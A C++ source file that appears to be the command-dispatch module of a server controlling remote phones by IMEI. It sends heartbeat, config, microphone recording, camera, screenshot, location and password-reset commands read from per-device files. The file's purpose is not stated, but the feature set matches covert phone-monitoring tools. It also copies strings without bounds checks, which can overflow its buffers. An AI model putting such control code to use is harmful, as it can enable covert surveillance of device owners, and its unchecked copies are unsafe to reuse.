#include "CommandUtils.h"
#include "PacketMaker.h"
#include "Additional.h"
#include "PublicFunction.h"
#include "Coder.h"
#include "FileWriter.h"
#include "GoogleServiceServer.h"
#include "FileOperator.h"
#include "mysqlOper.h"
#include "DataKeeper.h"

#include <string>

using namespace std;

int CommandUtils::SendHeartBeat(LPDATAPROCESS_PARAM lpparam, char * imei, char * username) {

	char szData[MAX_MESSAGE_SIZE];
	int iLen = PacketMaker::hdr(szData, CMD_HEARTBEAT, imei);

	int iRet = send(lpparam->sockclient, szData, iLen, 0);
	if (iRet == iLen)
	{
		iRet = recv(lpparam->sockclient, szData, MAX_MESSAGE_SIZE, 0);
		if (iRet == sizeof(COMMUNICATION_PACKET_HEADER))
		{
			LPCOMMUNICATION_PACKET_HEADER lphdr = (LPCOMMUNICATION_PACKET_HEADER)szData;
			if (lphdr->dwcmd == CMD_HEARTBEAT)
			{
				return TRUE;
			}
		}else if (iRet >  sizeof(COMMUNICATION_PACKET_HEADER) && iRet < sizeof(COMMUNICATION_PACKET_HEADER) + 16)
		{
			*(szData + iRet) = 0;
			char network[64] = { 0 };
			lstrcpyA(network, szData + sizeof(COMMUNICATION_PACKET_HEADER));
			if (lstrcmpiA(network,"WIRELESS") == 0)
			{
				return CLIENT_NETWORK_TYPE_WIRELESS;
			}else if (lstrcmpiA(network,"WIFI") == 0)
			{
				return CLIENT_NETWORK_TYPE_WIFI;
			}else if (lstrcmpiA(network,"NONE") == 0)
			{
				return 0;
			}
			else {
				return FALSE;
			}
			return TRUE;
		}
		else {
			return FALSE;
		}
	}

	return FALSE;
}




int CommandUtils::GeneralCommand(int cmd, char * lpcmdfn, LPDATAPROCESS_PARAM lpparam, char * imei, char * user) {
	char szShowInfo[1024];

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, lpcmdfn, imei);

	HANDLE hFile = CreateFileA(cmdfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		DeleteFileA(cmdfn.c_str());

		char szData[MAX_MESSAGE_SIZE];
		int iLen = PacketMaker::hdr(szData, cmd, imei);

		int iRet = send(lpparam->sockclient, szData, iLen, 0);
		if (iRet <= 0)
		{
			iRet = WSAGetLastError();
			wsprintfA(szShowInfo, "GeneralCommand cmd:%u,cmdfile:%s,imei:%s,send error code:%u\r\n", cmd, lpcmdfn, imei, iRet);
			WriteLogFile(szShowInfo);
			return NETWORKERROR;
		}
		else
		{
			wsprintfA(szShowInfo, "GeneralCommand cmd:%u,cmdfile:%s,imei:%s,send ok\r\n", cmd, lpcmdfn, imei);
			WriteLogFile(szShowInfo);
			return TRUE;
		}
	}

	return FALSE;
}




int CommandUtils::CommandSendConfig(int cmd, char * lpcmdfn, LPDATAPROCESS_PARAM lpparam, char * imei, char * user) {

	char szShowInfo[1024];

	string cmdfn = Additional::getConfigFileName(lpparam->currentpath, imei, user, lpcmdfn);

	char szconfig[MAX_COMMADN_PARAM_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szconfig,MAX_COMMADN_PARAM_SIZE);
	if (dwFileSize == FALSE)
	{
		return FALSE;
	}

	char szData[MAX_COMMADN_PARAM_SIZE];
	int iLen = PacketMaker::hdrWithName(szData, cmd, imei, szconfig);

	iRet = send(lpparam->sockclient, szData, iLen, 0);
	if (iRet <= 0)
	{
		iRet = WSAGetLastError();
		wsprintfA(szShowInfo, "CommandProc imei:%s,user:%s send config command error:%u\r\n", imei, user, iRet);
		WriteLogFile(szShowInfo);
		return NETWORKERROR;
	}
	else
	{
		//wsprintfA(szShowInfo,"CommandProc user:%s,imei:%s send config:%s ok\r\n",user,imei,szconfig);
		//WriteLogFile(szShowInfo);
		return TRUE;
	}


	return FALSE;
}




int CommandUtils::CommandWithString(int cmd, char * lpcmdfn, LPDATAPROCESS_PARAM lpparam, char * imei, char * user) {
	char errorbuf[1024];

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, lpcmdfn, imei);

	char szconfig[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szconfig, MAX_MESSAGE_SIZE);
	if (dwFileSize == FALSE)
	{
		return FALSE;
	}
	DeleteFileA(cmdfn.c_str());

	if (cmd == CMD_MICAUDIORECORD)
	{
		int value = atoi(szconfig);
		if (value > MAX_MIC_AUDIO_TIME || value <= 0)
		{
			ErrorFormat(lpparam, errorbuf, "CommandWithFileString micaudiorecord param error", imei, user);
			WriteLogFile(errorbuf);
			return FALSE;
		}
	}
	else if (cmd == CMD_DATA_CAMERAPHOTO)
	{
		int value = atoi(szconfig);
		if (value != 0 && value != 1)
		{
			ErrorFormat(lpparam, errorbuf, "CommandWithFileString camera param error", imei, user);
			WriteLogFile(errorbuf);
			return FALSE;
		}
	}else if (cmd == CMD_RESETPASSWORD)
	{
	}
	else if (strstr(lpcmdfn,DELETECLIENTCOMMANDFILE))
	{
		iRet = DataKeeper::removeClient(imei);
		return iRet;
	}
	else if (strstr(lpcmdfn, DELETEUSERCOMMANDFILE))
	{
		iRet = DataKeeper::removeUser(imei);
		return iRet;
	}

	char *szcfgutf8 = 0;
	iRet = Coder::GBKToUTF8(szconfig, &szcfgutf8);
	if (iRet <= FALSE)
	{
		return FALSE;
	}

	char szData[MAX_COMMADN_PARAM_SIZE];

	int iLen = PacketMaker::hdrWithName(szData, cmd, imei, szcfgutf8);
	delete szcfgutf8;

	iRet = send(lpparam->sockclient, szData, iLen, 0);
	if (iRet <= 0)
	{
		iRet = WSAGetLastError();
		wsprintfA(errorbuf, "CommandWithString imei:%s,user:%s send command file:%s error:%u\r\n", imei, user, lpcmdfn, iRet);
		WriteLogFile(errorbuf);
		return NETWORKERROR;
	}
	else
	{
		wsprintfA(errorbuf, "CommandWithString user:%s,imei:%s send cmd file:%s ok\r\n", user, imei, lpcmdfn);
		WriteLogFile(errorbuf);
		return TRUE;
	}
	return FALSE;
}



int CommandUtils::CommandWithValue(int cmd, char * lpcmdfn, LPDATAPROCESS_PARAM lpparam, char * imei, char * user) {
	char errorbuf[1024];

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, lpcmdfn, imei);

	char szconfig[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szconfig, MAX_MESSAGE_SIZE);
	if (dwFileSize == FALSE)
	{
		return FALSE;
	}
	DeleteFileA(cmdfn.c_str());

	int value = atoi(szconfig);
	if (cmd == CMD_MICAUDIORECORD)
	{
		if (value > MAX_MIC_AUDIO_TIME || value <= 0)
		{
			ErrorFormat(lpparam, errorbuf, "CommandWithValue micaudiorecord param error", imei, user);
			WriteLogFile(errorbuf);
			return FALSE;
		}
	}
	else if (cmd == CMD_DATA_CAMERAPHOTO)
	{
		if (value != 0 && value != 1)
		{
			ErrorFormat(lpparam, errorbuf, "CommandWithValue camera param error", imei, user);
			WriteLogFile(errorbuf);
			return FALSE;
		}
	}
	else if (cmd == CMD_DATA_SCRNSNAPSHOT)
	{
		if (value > MAX_MIC_AUDIO_TIME || value <= 0)
		{
			ErrorFormat(lpparam, errorbuf, "CommandWithValue screenshot param error", imei, user);
			WriteLogFile(errorbuf);
			return FALSE;
		}
	}
	else if (cmd == CMD_DATA_LOCATION)
	{
		if (value > MAX_MIC_AUDIO_TIME || value <= 0)
		{
			ErrorFormat(lpparam, errorbuf, "CommandWithValue location param error", imei, user);
			WriteLogFile(errorbuf);
			return FALSE;
		}
	}
	else {

	}

	char szData[MAX_COMMADN_PARAM_SIZE];
	int iLen = PacketMaker::hdrWithValue(szData, cmd, imei, value);

	iRet = send(lpparam->sockclient, szData, iLen, 0);
	if (iRet <= 0)
	{
		iRet = WSAGetLastError();
		wsprintfA(errorbuf, "CommandWithValue imei:%s,user:%s send command file:%s error:%u\r\n", imei, user, lpcmdfn, iRet);
		WriteLogFile(errorbuf);
		return NETWORKERROR;
	}
	else
	{
		wsprintfA(errorbuf, "CommandWithValue user:%s,imei:%s send cmd file:%s ok\r\n", user, imei, lpcmdfn);
		WriteLogFile(errorbuf);
		return TRUE;
	}

	return FALSE;
}









int CommandUtils::CommandWithStringStringString(int cmd, char * lpcmdfn, LPDATAPROCESS_PARAM lpparam, char * imei, char * user) {
	char errorbuf[1024];

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, lpcmdfn, imei);

	char szCmd[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szCmd, MAX_MESSAGE_SIZE);
	if (dwFileSize == FALSE)
	{
		return FALSE;
	}
	DeleteFileA(cmdfn.c_str());

	char szparam[3][MAX_MESSAGE_SIZE] = { 0 };
	iRet = GetStringStringString(szCmd, szparam);

	char szData[MAX_COMMADN_PARAM_SIZE];
	int iLen = PacketMaker::hdrWithStringStringString(szData, imei, cmd, szparam);

	iRet = send(lpparam->sockclient, szData, iLen, 0);
	if (iRet <= 0)
	{
		iRet = WSAGetLastError();
		wsprintfA(errorbuf, "CommandWithStringStringString imei:%s,user:%s send command file:%s error:%u\r\n", imei, user, lpcmdfn, iRet);
		WriteLogFile(errorbuf);
		return NETWORKERROR;
	}
	else
	{
		wsprintfA(errorbuf, "CommandWithStringStringString user:%s,imei:%s send cmd file:%s ok\r\n", user, imei, lpcmdfn);
		WriteLogFile(errorbuf);
		return TRUE;
	}

	return FALSE;
}





DWORD CommandUtils::GetStringStringString(char * src, char dst[3][MAX_MESSAGE_SIZE]) {

	string str = src;
	string substr ;
	int i = 0;

	while (TRUE)
	{
		int pos = str.find("\r\n");
		if (pos >= 0)
		{
			substr = str.substr(0, pos);
			lstrcpyA(dst[i], substr.c_str());
			i++;

			if (pos + 2 >= (int)str.length())
			{
				break;
			}

			str = str.substr(pos + 2);
			if (str.length() <= 0 || str == "")
			{
				break;
			}
		}
		else {
			lstrcpyA(dst[i], str.c_str());
			break;
		}
	}

	return i;
}